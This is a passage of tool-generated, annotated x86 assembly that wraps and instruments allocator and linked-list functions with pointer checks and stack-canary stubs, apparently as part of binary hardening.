   call    Func_0x804a770  #pp1: Label_0x804a770 VAR_ADDRESS #32
   mov     0xc(%esi), %ecx                    # [6(2636)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [7(2637)]   #32
   je      Label_0x804a7ff #32
   mov     0x8(%esi), %edx                    # [9(2639)]Using Pointer PTRCHECK arg[0]    #32
   mov     %edx, 0x8(%ecx)                    # [10(2640)]Using Pointer PTRCHECK arg[1]    #32
Label_0x804a7ff: #p6a
   mov     0x8(%esi), %ecx                    # [11(2641)]Using Pointer PTRCHECK arg[0]  Already checked [9]   #32
   test    %ecx, %ecx                         # [12(2642)]   #32
   je      Label_0x804a80c #32
   mov     0xc(%esi), %edx                    # [14(2644)]Using Pointer PTRCHECK arg[0]  Already checked [6]   #32
   mov     %edx, 0xc(%ecx)                    # [15(2645)]Using Pointer PTRCHECK arg[1]    #32
Label_0x804a80c: #p6a
   cmp     %esi, Var_0x80604c8(, %eax ,  0x4) # [16(2646)]Using Global Array Variable
#  PTRCHECK arg[1]    #32
   jne     Label_0x804a81f #32
   mov     0x8(%esi), %ecx                    # [18(2648)]Using Pointer PTRCHECK arg[0]  Already checked [11]   #32
   mov     %ecx, Var_0x80604c8(, %eax ,  0x4) # [19(2649)]Using Global Array Variable
#  PTRCHECK arg[1]  Already checked [16]   #32
Label_0x804a81f: #p6a
   movl    $0x0, 0x8(%esi)                    # [20(2650)]Using Pointer PTRCHECK arg[1]  Already checked [18, 11]   #32
   movl    $0x0, 0xc(%esi)                    # [21(2651)]Using Pointer PTRCHECK arg[1]  Already checked [14, 6]   #32
   movl    $0x0, 0x4(%esi)                    # [22(2652)]Using Pointer PTRCHECK arg[1]    #32
   add     $0x8, %esp                         # [23(2653)]stackSize = 0x4   #32
   pop     %esi                               # [24(2654)]stackSize = 0x0   #32
Label_0x804a838: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:48 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 47
     adding function wrapper

;     Start Index : 2610 (0x804a790)
;       End Index : 2629 (0x804a7dc)
;   Num Instructs : 20
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0x8),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 3
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5320,7
.p2align 3,0x5325
FuncPtr_0x804a790:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a790,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a790:

Label_0x804a790:
   push    %esi                               # [0(2610)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2611)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(2612)]   #32
   mov     (%esi), %eax                       # [3(2613)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [4(2614)]   #32
   call    Func_0x804a770  #pp1: Label_0x804a770 VAR_ADDRESS #32
   movl    $0x1, 0x4(%esi)                    # [6(2616)]Using Pointer PTRCHECK arg[1]    #32
   mov     Var_0x80604c8(, %eax ,  0x4), %ecx # [7(2617)]Using Global Array Variable
#  PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [8(2618)]   #32
   je      Label_0x804a7d1 #32
   mov     %ecx, 0x8(%esi)                    # [10(2620)]Using Pointer PTRCHECK arg[1]    #32
   mov     Var_0x80604c8(, %eax ,  0x4), %ecx # [11(2621)]Using Global Array Variable
#  PTRCHECK arg[0]  Already checked [7]   #32
   mov     %esi, 0xc(%ecx)                    # [12(2622)]Using Pointer PTRCHECK arg[1]    #32
   mov     %esi, Var_0x80604c8(, %eax ,  0x4) # [13(2623)]Using Global Array Variable
#  PTRCHECK arg[1]  Already checked [11]   #32
   movl    $0x0, 0xc(%esi)                    # [14(2624)]Using Pointer PTRCHECK arg[1]    #32
   jmp     Label_0x804a7d8 #32
Label_0x804a7d1: #p6a
   mov     %esi, Var_0x80604c8(, %eax ,  0x4) # [16(2626)]Using Global Array Variable
#  PTRCHECK arg[1]  Already checked [7]   #32
Label_0x804a7d8: #p6a
   add     $0x8, %esp                         # [17(2627)]stackSize = 0x4   #32
   pop     %esi                               # [18(2628)]stackSize = 0x0   #32
Label_0x804a7dc: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:47 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 10
     adding function wrapper

;     Start Index : 490 (0x8048790)
;       End Index : 562 (0x804887d)
;   Num Instructs : 73
;      Stack Size : 16 (0x10)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 5
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0x10), 0x4(0xc); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 14
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x820,7
.p2align 3,0x825
FuncPtr_0x8048790:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048790,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048790:

Label_0x8048790:
   push    %ebx                               # [0(490)]stackSize = 0x4   #32
   push    %edi                               # [1(491)]stackSize = 0x8   #32
   push    %esi                               # [2(492)]stackSize = 0xc   #32
   sub     $0x10, %esp                        # [3(493)]stackSize = 0x1c   #32
   mov     %edx, %esi                         # [4(494)]   #32
   mov     %ecx, %edi                         # [5(495)]   #32
   cmpl    $0x0, 0x20(%edi)                   # [6(496)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x80487c8 #32
   mov     0x38(%edi), %ecx                   # [8(498)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, %edx                         # [9(499)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80487a5
   .long    Func_0x8048790  #pp1w: Label_0x8048790 VAR_ADDRESS #32
   mov     0x3c(%edi), %ecx                   # [11(501)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, %edx                         # [12(502)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80487af
   .long    Func_0x8048790  #pp1w: Label_0x8048790 VAR_ADDRESS #32
   mov     0x40(%edi), %ecx                   # [14(504)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, %edx                         # [15(505)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80487b9
   .long    Func_0x8048790  #pp1w: Label_0x8048790 VAR_ADDRESS #32
   mov     0x44(%edi), %ecx                   # [17(507)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, %edx                         # [18(508)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80487c3
   .long    Func_0x8048790  #pp1w: Label_0x8048790 VAR_ADDRESS #32
Label_0x80487c8: #p6a
   mov     0xc(%edi), %edi                    # [20(510)]Using Pointer PTRCHECK arg[0]    #32
   jmp     Label_0x80487d3 #32
Label_0x80487d0: #p6a
   mov     0x14(%edi), %edi                   # [22(512)]Using Pointer PTRCHECK arg[0]    #32
Label_0x80487d3: #p6a
   test    %edi, %edi                         # [23(513)]   #32
   je      Label_0x8048877 #32
   cmpl    $0x0, 0x8(%edi)                    # [25(515)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x80487e7 #32
   cmpl    $0x0, 0xc(%edi)                    # [27(517)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x80487d0 #32
Label_0x80487e7: #p6a
   movl    $0x18, 0x4(%esp)                   # [29(519)]   #32
   movl    $0x1, (%esp)                       # [30(520)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80487f6
   .long    Func_0x804a2d0  #pp1w: Label_0x804a2d0 VAR_ADDRESS #32
   movsd   (%edi), %xmm0                      # [32(522)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%edi), %xmm1                   # [33(523)]Using Pointer PTRCHECK arg[0]  Already checked [25]   #32
   movsd   %xmm1, 0x8(%eax)                   # [34(524)]Using Pointer PTRCHECK arg[1]  Already checked [34]   #32
   movsd   %xmm0, (%eax)                      # [35(525)]Using Pointer PTRCHECK arg[1]  Already checked [41, 35]   #32
   mov     (%esi), %ebx                       # [36(526)]Using Pointer PTRCHECK arg[0]  Already checked [66, 36]   #32
   test    %ebx, %ebx                         # [37(527)]   #32
   je      Label_0x8048870 #32
   test    %eax, %eax                         # [39(529)]   #32
   je      Label_0x80487d0 #32
   mov     (%eax), %edx                       # [41(531)]Using Pointer PTRCHECK arg[0]  Already checked [35]   #32
Label_0x8048820: #p6a
   mov     %ebx, %ecx                         # [42(532)]   #32
   cmp     %edx, (%ecx)                       # [43(533)]Using Pointer PTRCHECK arg[1]    #32
   jl      Label_0x8048830 #32
   jne     Label_0x8048842 #32
   mov     0x4(%ecx), %ebx                    # [46(536)]Using Pointer PTRCHECK arg[0]    #32
   cmp     0x4(%eax), %ebx                    # [47(537)]Using Pointer PTRCHECK arg[0]  Already checked [47]   #32
   jge     Label_0x8048842 #32
Label_0x8048830: #p6a
   mov     0x14(%ecx), %ebx                   # [49(539)]Using Pointer PTRCHECK arg[0]    #32
   test    %ebx, %ebx                         # [50(540)]   #32
   jne     Label_0x8048820 #32
   mov     %eax, 0x14(%ecx)                   # [52(542)]Using Pointer PTRCHECK arg[1]  Already checked [49]   #32
   mov     %ecx, 0x10(%eax)                   # [53(543)]Using Pointer PTRCHECK arg[1]  Already checked [64, 53]   #32
   mov     0x14(%edi), %edi                   # [54(544)]Using Pointer PTRCHECK arg[0]    #32
   jmp     Label_0x80487d3 #32
Label_0x8048842: #p6a
   mov     0x10(%ecx), %edx                   # [56(546)]Using Pointer PTRCHECK arg[0]    #32
   test    %edx, %edx                         # [57(547)]   #32
   je      Label_0x804884c #32
   mov     %eax, 0x14(%edx)                   # [59(549)]Using Pointer PTRCHECK arg[1]    #32
Label_0x804884c: #p6a
   mov     %ecx, 0x14(%eax)                   # [60(550)]Using Pointer PTRCHECK arg[1]  Already checked [60]   #32
   mov     0x10(%ecx), %edx                   # [61(551)]Using Pointer PTRCHECK arg[0]  Already checked [56]   #32
   mov     %edx, 0x10(%eax)                   # [62(552)]Using Pointer PTRCHECK arg[1]  Already checked [64, 53]   #32
   mov     %eax, 0x10(%ecx)                   # [63(553)]Using Pointer PTRCHECK arg[1]  Already checked [61]   #32
   cmpl    $0x0, 0x10(%eax)                   # [64(554)]Using Pointer PTRCHECK arg[1]  Already checked [62]   #32
   jne     Label_0x80487d0 #32
Label_0x8048870: #p6a
   mov     %eax, (%esi)                       # [66(556)]Using Pointer PTRCHECK arg[1]  Already checked [36]   #32
   jmp     Label_0x80487d0 #32
Label_0x8048877: #p6a
   add     $0x10, %esp                        # [68(558)]stackSize = 0xc   #32
   pop     %esi                               # [69(559)]stackSize = 0x8   #32
   pop     %edi                               # [70(560)]stackSize = 0x4   #32
   pop     %ebx                               # [71(561)]stackSize = 0x0   #32
Label_0x804887d: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:10 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 35
     adding function wrapper

;     Start Index : 2249 (0x804a2d0)
;       End Index : 2278 (0x804a31d)
;   Num Instructs : 30
;      Stack Size : 20 (0x14)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 3
;     ESP Offsets : 5
;                 :  0x0(0x14), 0x4(0x10), 0x8(0xc),
;      ESP Params : 
;                 :  0x20(0x4), 0x24(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x9520,7
.p2align 3,0x9525
FuncPtr_0x804a2d0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a2d0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a2d0:

Label_0x804a2d0:
   push    %edi                               # [0(2249)]stackSize = 0x4   #32
   push    %esi                               # [1(2250)]stackSize = 0x8   #32
   sub     $0x14, %esp                        # [2(2251)]stackSize = 0x1c   #32
   mov     0x24(%esp), %ecx                   # [3(2252)]   #32
   test    %ecx, %ecx                         # [4(2253)]   #32
   je      Label_0x804a316 #32
   mov     0x28(%esp), %edi                   # [6(2255)]   #32
   test    %edi, %edi                         # [7(2256)]   #32
   je      Label_0x804a316 #32
   mov     %edi, %esi                         # [9(2258)]   #32
   imul    %ecx, %esi                         # [10(2259)]   #32
   xor     %edx, %edx                         # [11(2260)]   #32
   mov     %esi, %eax                         # [12(2261)]   #32
   div     %edi                               # [13(2262)]   #32
   cmp     %ecx, %eax                         # [14(2263)]   #32
   jne     Label_0x804a316 #32
   mov     %esi, (%esp)                       # [16(2265)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a2f7
   .long    Func_0x804a560  #pp1w: Label_0x804a560 VAR_ADDRESS #32
   test    %eax, %eax                         # [18(2267)]   #32
   je      Label_0x804a316 #32
   mov     %esi, 0x8(%esp)                    # [20(2269)]   #32
   mov     %eax, (%esp)                       # [21(2270)]   #32
   movl    $0x0, 0x4(%esp)                    # [22(2271)]   #32
   call    Func_0x804aa50  #pp1: Label_0x804aa50 VAR_ADDRESS #32
   jmp     Label_0x804a318 #32
Label_0x804a316: #p6a
   xor     %eax, %eax                         # [25(2274)]   #32
Label_0x804a318: #p6a
   add     $0x14, %esp                        # [26(2275)]stackSize = 0x8   #32
   pop     %esi                               # [27(2276)]stackSize = 0x4   #32
   pop     %edi                               # [28(2277)]stackSize = 0x0   #32
Label_0x804a31d: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:35 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 50   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2738 (0x804a930)
;       End Index : 2748 (0x804a94a)
;   Num Instructs : 11
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 0; Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 2
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4920,7
.p2align 3,0x4925
FuncPtr_0x804a930:

Func_0x804a930:

Label_0x804a930:
   mov     0x14(%ecx), %eax                   # [0(2738)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [1(2739)]   #32
   je      Label_0x804a93d #32
   mov     0x10(%ecx), %edx                   # [3(2741)]Using Pointer PTRCHECK arg[0]    #32
   mov     %edx, 0x10(%eax)                   # [4(2742)]Using Pointer PTRCHECK arg[1]    #32
Label_0x804a93d: #p6a
   mov     0x10(%ecx), %eax                   # [5(2743)]Using Pointer PTRCHECK arg[0]  Already checked [3]   #32
   test    %eax, %eax                         # [6(2744)]   #32
   je      Label_0x804a94a #32
   mov     0x14(%ecx), %ecx                   # [8(2746)]Using Pointer PTRCHECK arg[0]  Already checked [0]   #32
   mov     %ecx, 0x14(%eax)                   # [9(2747)]Using Pointer PTRCHECK arg[1]    #32
Label_0x804a94a: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:50 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 43
     adding function wrapper

;     Start Index : 2456 (0x804a560)
;       End Index : 2548 (0x804a6a9)
;   Num Instructs : 93
;      Stack Size : 20 (0x14)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 5
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 5
;     ESP Offsets : 6
;                 :  0x0(0x14), 0x4(0x10), 0x8(0xc), 0x10(0x4),
;                 :  0x14(0x0),
;      ESP Params : 
;                 :  0x20(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall allocate

;
;-------------------------*/

.p2align 4,0x3520,7
.p2align 3,0x3525
FuncPtr_0x804a560:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a560,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a560:

Label_0x804a560:
   push    %ebx                               # [0(2456)]stackSize = 0x4   #32
   push    %esi                               # [1(2457)]stackSize = 0x8   #32
   sub     $0x14, %esp                        # [2(2458)]stackSize = 0x1c   #32
   xor     %esi, %esi                         # [3(2459)]   #32
   mov     0x24(%esp), %ebx                   # [4(2460)]   #32
   test    %ebx, %ebx                         # [5(2461)]   #32
   je      Label_0x804a63f #32
   lea     0x18(%ebx), %eax                   # [7(2463)] Loading Pointer with stackSize: 28   #32
   cmp     $0x40000, %eax                     # [8(2464)]   #32
   jb      Label_0x804a589 #32
   mov     %ebx, %ecx                         # [10(2466)]   #32
   add     $0x14, %esp                        # [11(2467)]stackSize = 0x8   #32
   pop     %esi                               # [12(2468)]stackSize = 0x4   #32
   pop     %ebx                               # [13(2469)]stackSize = 0x0   #32
   jmp     Label_0x804a650 #32
Label_0x804a589: #p6a
   test    $0x7, %bl                          # [15(2471)]   #32
   je      Label_0x804a594 #32
   add     $0x7, %ebx                         # [17(2473)]   #32
   and     $-0x8, %ebx                        # [18(2474)]   #32
Label_0x804a594: #p6a
   test    %ebx, %ebx                         # [19(2475)]   #32
   js      Label_0x804a63f #32
   add     $0x18, %ebx                        # [21(2477)]   #32
   movl    $0x0, 0x10(%esp)                   # [22(2478)]   #32
   lea     0x10(%esp), %edx                   # [23(2479)] Loading Pointer with stackSize: 28   #32
   mov     %ebx, %ecx                         # [24(2480)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a5ad
   .long    Func_0x804a6b0  #pp1w: Label_0x804a6b0 VAR_ADDRESS #32
   cmpl    $0x0, 0x10(%esp)                   # [26(2482)]   #32
   jne     Label_0x804a5cb #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a5b9
   .long    Func_0x804a700  #pp1w: Label_0x804a700 VAR_ADDRESS #32
   test    %eax, %eax                         # [29(2485)]   #32
   jne     Label_0x804a63f #32
   mov     Var_0x8060544, %eax                # [31(2487)]   #32
   mov     %eax, 0x10(%esp)                   # [32(2488)]   #32
Label_0x804a5cb: #p6a
   mov     0x10(%esp), %eax                   # [33(2489)]   #32
   mov     %eax, (%esp)                       # [34(2490)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a5d2
   .long    Func_0x804a7e0  #pp1w: Label_0x804a7e0 VAR_ADDRESS #32
   mov     0x10(%esp), %ecx                   # [36(2492)]   #32
   mov     (%ecx), %edx                       # [37(2493)]Using Pointer PTRCHECK arg[0]    #32
   sub     %ebx, %edx                         # [38(2494)]   #32
   cmp     $0x31, %edx                        # [39(2495)]   #32
   jb      Label_0x804a638 #32
   lea     (%ecx, %ebx ,  0x1), %eax          # [41(2497)] Loading Pointer with stackSize: 28   # <<<=== Need to Address an Array
   mov     %edx, (%ecx, %ebx ,  0x1)          # [42(2498)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   movl    $0x1, 0x4(%ecx, %ebx ,  0x1)       # [43(2499)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   movl    $0x0, 0x8(%ecx, %ebx ,  0x1)       # [44(2500)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   movl    $0x0, 0xc(%ecx, %ebx ,  0x1)       # [45(2501)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   mov     0x10(%esp), %edx                   # [46(2502)]   #32
   mov     %ebx, (%edx)                       # [47(2503)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x10(%esp), %edx                   # [48(2504)]   #32
   mov     %edx, 0x14(%ecx, %ebx ,  0x1)      # [49(2505)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   mov     0x10(%esp), %edx                   # [50(2506)]   #32
   mov     0x10(%edx), %edx                   # [51(2507)]Using Pointer PTRCHECK arg[0]    #32
   mov     %edx, 0x10(%ecx, %ebx ,  0x1)      # [52(2508)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   mov     0x10(%esp), %ecx                   # [53(2509)]   #32
   mov     0x10(%ecx), %ecx                   # [54(2510)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [55(2511)]   #32
   je      Label_0x804a629 #32
   mov     %eax, 0x14(%ecx)                   # [57(2513)]Using Pointer PTRCHECK arg[1]    #32
Label_0x804a629: #p6a
   mov     0x10(%esp), %ecx                   # [58(2514)]   #32
   mov     %eax, 0x10(%ecx)                   # [59(2515)]Using Pointer PTRCHECK arg[1]    #32
   mov     %eax, (%esp)                       # [60(2516)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a633
   .long    Func_0x804a790  #pp1w: Label_0x804a790 VAR_ADDRESS #32
Label_0x804a638: #p6a
   mov     0x10(%esp), %esi                   # [62(2518)]   #32
   add     $0x18, %esi                        # [63(2519)]   #32
Label_0x804a63f: #p6a
   mov     %esi, %eax                         # [64(2520)]   #32
   add     $0x14, %esp                        # [65(2521)]stackSize = 0x8   #32
   pop     %esi                               # [66(2522)]stackSize = 0x4   #32
   pop     %ebx                               # [67(2523)]stackSize = 0x0   #32
Label_0x804a646: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x804a650: #p6a
   push    %esi                               # [69(2525)]stackSize = 0x4   #32
   sub     $0x18, %esp                        # [70(2526)]stackSize = 0x1c   #32
   mov     %ecx, %esi                         # [71(2527)]   #32
   add     $0x18, %esi                        # [72(2528)]   #32
   lea     0x14(%esp), %eax                   # [73(2529)] Loading Pointer with stackSize: 28   #32
   mov     %eax, 0x8(%esp)                    # [74(2530)]   #32
   mov     %esi, (%esp)                       # [75(2531)]   #32
   movl    $0x0, 0x4(%esp)                    # [76(2532)]   #32
   call    _allocate                          # [77(2533)]  System Call to allocate() #32
   mov     %eax, %ecx                         # [78(2534)]   #32
   xor     %eax, %eax                         # [79(2535)]   #32
   test    %ecx, %ecx                         # [80(2536)]   #32
   jne     Label_0x804a6a5 #32
   mov     0x14(%esp), %eax                   # [82(2538)]   #32
   mov     %esi, (%eax)                       # [83(2539)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x4(%eax)                    # [84(2540)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0xc(%eax)                    # [85(2541)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x8(%eax)                    # [86(2542)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x14(%eax)                   # [87(2543)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x10(%eax)                   # [88(2544)]Using Pointer PTRCHECK arg[1]    #32
   add     $0x18, %eax                        # [89(2545)]   #32
Label_0x804a6a5: #p6a
   add     $0x18, %esp                        # [90(2546)]stackSize = 0x4   #32
   pop     %esi                               # [91(2547)]stackSize = 0x0   #32
Label_0x804a6a9: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:43 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 74   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2751 (0x804a950)
;       End Index : 2772 (0x804a987)
;   Num Instructs : 22
;      Stack Size : 0 (0x0)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0xc(0x4), 0x10(0x4), 0x14(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x7920,7
.p2align 3,0x7925
FuncPtr_0x804a950:

Func_0x804a950:

Label_0x804a950:
   push    %edi                               # [0(2751)]stackSize = 0x4   #32
   push    %esi                               # [1(2752)]stackSize = 0x8   #32
   xor     %ecx, %ecx                         # [2(2753)]   #32
   mov     0x14(%esp), %edx                   # [3(2754)]   #32
   test    %edx, %edx                         # [4(2755)]   #32
   mov     $0x0, %eax                         # [5(2756)]# FLAGS USED   #32
   je      Label_0x804a985 #32
   mov     0x10(%esp), %edi                   # [7(2758)]   #32
   mov     0xc(%esp), %esi                    # [8(2759)]   #32
Label_0x804a970: #p6a
   movzbl  (%esi, %ecx ,  0x1), %eax          # [9(2760)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   cmp     %edi, %eax                         # [10(2761)]   #32
   je      Label_0x804a981 #32
   add     $0x1, %ecx                         # [12(2763)]   #32
   xor     %eax, %eax                         # [13(2764)]   #32
   cmp     %edx, %ecx                         # [14(2765)]   #32
   jb      Label_0x804a970 #32
   jmp     Label_0x804a985 #32
Label_0x804a981: #p6a
   add     %ecx, %esi                         # [17(2768)]   #32
   mov     %esi, %eax                         # [18(2769)]   #32
Label_0x804a985: #p6a
   pop     %esi                               # [19(2770)]stackSize = 0x4   #32
   pop     %edi                               # [20(2771)]stackSize = 0x0   #32
Label_0x804a987: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:74 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 45
     adding function wrapper

;     Start Index : 2575 (0x804a700)
;       End Index : 2597 (0x804a766)
;   Num Instructs : 23
;      Stack Size : 28 (0x1c)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 4
;     ESP Offsets : 4
;                 :  0x0(0x1c), 0x4(0x18), 0x8(0x14), 0x18(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall allocate

;
;-------------------------*/

.p2align 4,0x4720,7
.p2align 3,0x4725
FuncPtr_0x804a700:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a700,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a700:

Label_0x804a700:
   sub     $0x1c, %esp                        # [0(2575)]stackSize = 0x1c   #32
   lea     0x18(%esp), %eax                   # [1(2576)] Loading Pointer with stackSize: 28   #32
   mov     %eax, 0x8(%esp)                    # [2(2577)]   #32
   movl    $0x0, 0x4(%esp)                    # [3(2578)]   #32
   movl    $0x40000, (%esp)                   # [4(2579)]   #32
   call    _allocate                          # [5(2580)]  System Call to allocate() #32
   test    %eax, %eax                         # [6(2581)]   #32
   mov     $0x1, %eax                         # [7(2582)]# FLAGS USED   #32
   jne     Label_0x804a763 #32
   mov     0x18(%esp), %ecx                   # [9(2584)]   #32
   test    %ecx, %ecx                         # [10(2585)]   #32
   je      Label_0x804a763 #32
   movl    $0x40000, (%ecx)                   # [12(2587)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x1, 0x4(%ecx)                    # [13(2588)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0xc(%ecx)                    # [14(2589)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x8(%ecx)                    # [15(2590)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x14(%ecx)                   # [16(2591)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x10(%ecx)                   # [17(2592)]Using Pointer PTRCHECK arg[1]    #32
   mov     %ecx, (%esp)                       # [18(2593)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a75c
   .long    Func_0x804a790  #pp1w: Label_0x804a790 VAR_ADDRESS #32
   xor     %eax, %eax                         # [20(2595)]   #32
Label_0x804a763: #p6a
   add     $0x1c, %esp                        # [21(2596)]stackSize = 0x0   #32
Label_0x804a766: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:45 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 44
     adding function wrapper

;     Start Index : 2549 (0x804a6b0)
;       End Index : 2574 (0x804a6f1)
;   Num Instructs : 26
;      Stack Size : 0 (0x0)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
